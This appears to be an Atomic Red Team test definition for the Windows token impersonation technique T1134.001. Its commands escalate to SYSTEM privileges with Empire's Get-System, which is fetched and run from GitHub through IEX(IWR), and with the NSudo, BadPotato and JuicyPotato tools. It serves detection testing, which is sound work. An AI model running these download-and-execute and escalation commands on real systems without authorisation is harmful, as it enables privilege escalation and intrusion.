@@ -1,0 +1,132 @@
+attack_technique: T1134.001
+display_name: 'Access Token Manipulation: Token Impersonation/Theft'
+atomic_tests:
+- name: Named pipe client impersonation
+  auto_generated_guid: 90db9e27-8e7c-4c04-b602-a45927884966
+  description: |-
+    Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
+    When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+
+    Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
+    name: powershell
+    elevation_required: true
+- name: '`SeDebugPrivilege` token duplication'
+  auto_generated_guid: 34f0a430-9d04-4d98-bcb5-1989f14719f0
+  description: |-
+    Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
+    When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
+    name: powershell
+    elevation_required: true
+- name: Launch NSudo Executable
+  auto_generated_guid: 7be1bc0f-d8e5-4345-9333-f5f67d742cb9
+  description: |-
+    Launches the NSudo executable for a short period of time and then exits.
+    NSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.
+  supported_platforms:
+  - windows
+  input_arguments:
+    nsudo_path:
+      description: 'Path to the NSudoLG.exe file'
+      type: path
+      default: PathToAtomicsFolder\T1134.001\bin\NSudoLG.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      NSudoLG.exe must exist in the specified path #{nsudo_path}
+    prereq_command: |
+      if (Test-Path "#{nsudo_path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip" "https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip"
+      Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components" -Force
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLG.exe" "#{nsudo_path}"
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip" -Recurse -ErrorAction Ignore
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components" -Recurse -ErrorAction Ignore
+  executor:
+    command: |
+      Start-Process "#{nsudo_path}" -Argument "-U:T -P:E cmd"
+      Start-Sleep -Second 5
+      Stop-Process -Name "cmd" -force -erroraction silentlycontinue
+    name: powershell
+- name: Bad Potato
+  auto_generated_guid: 9c6d799b-c111-4749-a42f-ec2f8cb51448
+  description: |-
+    https://github.com/BeichenDream/BadPotato
+    Privilege escalation using named pipe connections
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      BadPotato.exe must exist in the temp directory
+    prereq_command: |
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe" "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true"
+  executor:
+    command: |
+      cd "PathToAtomicsFolder\..\ExternalPayloads"
+      Start-Process .\BadPotato.exe notepad.exe
+      Start-Sleep -Second 20
+      Stop-Process -Name "notepad" -force -erroraction silentlycontinue
+      Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
+    cleanup_command: |
+      taskkill /f /im notepad.exe
+    name: powershell
+    elevation_required: true
+- name: Juicy Potato
+  auto_generated_guid: f095e373-b936-4eb4-8d22-f47ccbfbe64a
+  description: |-
+    This Atomic utilizes Juicy Potato to obtain privilege escalation. 
+    Upon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.
+    This tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns. 
+    [Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)
+  supported_platforms:
+  - windows
+  input_arguments:
+    potato_path:
+      description: 'Path to the JuicyPotato.exe file'
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe 
+    listening_port:
+      description: 'COM server listen port'
+      type: integer
+      default: 7777
+    target_exe:
+      description: 'Target executable to launch with system privileges'
+      type: path
+      default: $env:windir\system32\notepad.exe
+    target_CLSID:
+      description: 'Vulnerable CLSID to impersonate privileges'
+      type: string
+      default: '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      JuicyPotato.exe must exist on disk
+    prereq_command: |
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe" "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
+  executor:
+    command: |
+      cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'
+    cleanup_command: |
+      get-ciminstance Win32_Process | where-object { $_.Path -eq "#{target_exe}" } | invoke-cimmethod -methodname "terminate" | out-null
+      get-ciminstance Win32_Process | where-object { $_.Path -eq "#{potato_path}" } | invoke-cimmethod -methodname "terminate" | out-null
+    name: powershell
+    elevation_required: true
